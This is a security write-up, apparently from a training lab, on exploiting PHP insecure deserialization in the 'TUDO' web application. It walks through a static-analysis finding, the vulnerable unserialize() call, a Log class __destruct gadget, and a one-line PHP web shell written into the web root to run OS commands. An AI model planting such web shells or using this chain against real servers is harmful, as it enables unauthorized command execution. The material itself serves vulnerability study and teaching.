# Remote Code Execution (RCE) via PHP Insecure Deserialization

This directory contains the documentation, technical analysis, and source code for the final phase of the exploit chain: **Remote Code Execution (RCE)** using administrator privileges.


## Overview

A Remote Code Execution (RCE) vulnerability allows an attacker to run arbitrary operating system commands on the hosting server. In the TUDO application, a critical flaw exists within the administrator management features. By exploiting an unsafe data-parsing mechanism, the server can be forced to instantiate internal blueprints and write a backdoor file directly onto the hard drive. This phase serves as the final step of the automated exploit script, converting administrative access into full control over the backend container environment.


## Static Analysis

Static analysis was performed using **ProgPilot**, which flagged a high-severity code injection vulnerability inside the administrative directory structure.

```json
[
  {
    "source_name": ["$userObj"],
    "source_line": [5],
    "source_column": [102],
    "source_file": ["\/workspace\/admin\/import_user.php"],
    "sink_name": "unserialize",
    "sink_line": 7,
    "sink_column": 183,
    "sink_file": "\/workspace\/admin\/import_user.php",
    "vuln_name": "code_injection",
    "vuln_cwe": "CWE_95",
    "vuln_id": "8fc9c5141674d34986c3ad4c55f46bbf0fca8b34d00e4e6ffe7a56d1faa06886",
    "vuln_type": "taint-style"
  }
]
```

### Interpretation of the Scanner Clue
The automated report provides the exact path of the flaw:
* **The Input Source:** Tainted user data enters the application on line 5 of `import_user.php` via the `$userObj` variable, which handles the user-controlled `POST['userobj']` parameter.
* **The Dangerous Destination (Sink):** On line 7, that exact unvalidated text parameter flows directly into PHP’s native `unserialize()` function.
* **The Problem Classification:** The tool labels this finding as **`code_injection` (CWE-95)**. In PHP programming, feeding raw user text directly into `unserialize()` allows an attacker to manipulate backend memory structures, hijack internal logic, and ultimately trigger server-side code execution.


## Source Code Review & Discovery Path

Guided by the static analysis data, a manual code review of the source files on disk was conducted to determine how to leverage this data sink into system command execution.

### Step 1: Evaluating the Data Entry Point
The file `admin/import_user.php` contains the following logic:
The code grabs the string from the web request and attempts to reconstruct a PHP object out of it using `unserialize()`. Because this occurs without any filtering, any class structure defined within the application can be forcibly created in the server's memory.

```php
<?php
    include('../includes/utils.php');

    if ($_SERVER['REQUEST_METHOD'] === 'POST') {
        $userObj = $_POST['userobj'];
        if ($userObj !== "") {
            $user = unserialize($userObj);      //line 7 
            include('../includes/db_connect.php');
            $ret = pg_prepare($db,
                "importuser_query", "insert into users (username, password, description) values ($1, $2, $3)");
            $ret = pg_execute($db, "importuser_query", array($user->username,$user->password,$user->description));
        }
    }
    header('location:/index.php');
    die();
?>

```

### Step 2: Finding the Target Class Blueprint
Because `import_user.php` includes `includes/utils.php` at the very top of the script, all classes inside the utility file are loaded and accessible. A review of `utils.php` revealed the definition of the **`Log`** class.

This class features a built-in PHP magic method named **`__destruct()`**. In the PHP lifecycle, this function triggers automatically on its own when a script finishes running and clears its memory. The function takes the class variable `$this->f` (filename) and blindly writes the contents of `$this->m` (the message) into it using `file_put_contents()`.

```php
class Log {
    public function __construct($f, $m) {
        $this->f = $f;
        $this->m = $m;
    }
    
    public function __destruct() {
        file_put_contents($this->f, $this->m, FILE_APPEND);
    }
}
```

## Exploitation

The attack follows a multi-stage sequence to achieve full remote command execution directly on the backend server container.

### Preconditions
Active administrative access is required to reach the target endpoint. This is achieved by utilizing the session cookie captured during privilege escalation.

### Step 1: Formulating the Safe Serialized Object

A crafted serialized PHP object was sent to `/admin/import_user.php`:

- `import_user.php` takes POST data and calls `unserialize()` on it directly
- PHP's `unserialize()` restores objects from strings — including calling `__destruct()` when done
- The `Log` class in `utils.php` has a `__destruct()` method that calls `file_put_contents($this->f, $this->m)`
- By faking a `Log` object, we control both the **filename** (`f`) and **content** (`m`)
- PHP automatically calls `__destruct()` after unserialization, writing our web shell to disk

The app never validates or sanitizes the `userobj` POST parameter before passing it to `unserialize()`. The `Log` class with a dangerous `__destruct()` is loaded and available in memory at the time of deserialization.

A file `imposter.php` is written to the web root containing:
```php
<?php exec($_GET['cmd'], $output); echo implode('\n', $output); ?>
```


### Step 2: Remote Code Execution — Running OS Commands

HTTP GET requests were sent to the newly created web shell:
- `exec()` runs the value of `cmd` as a real OS command on the server
- The output is collected into `$output` and printed back in the response

I wrote the file, the web server executes PHP, and `exec()` has no restrictions. Any command passed runs with the permissions of the web server process.

## Automated Exploit Script

The full remote code execution script can be found in `remote_code_execution.py`. It automates the entire process of cookie application, payload delivery, and evidence verification.
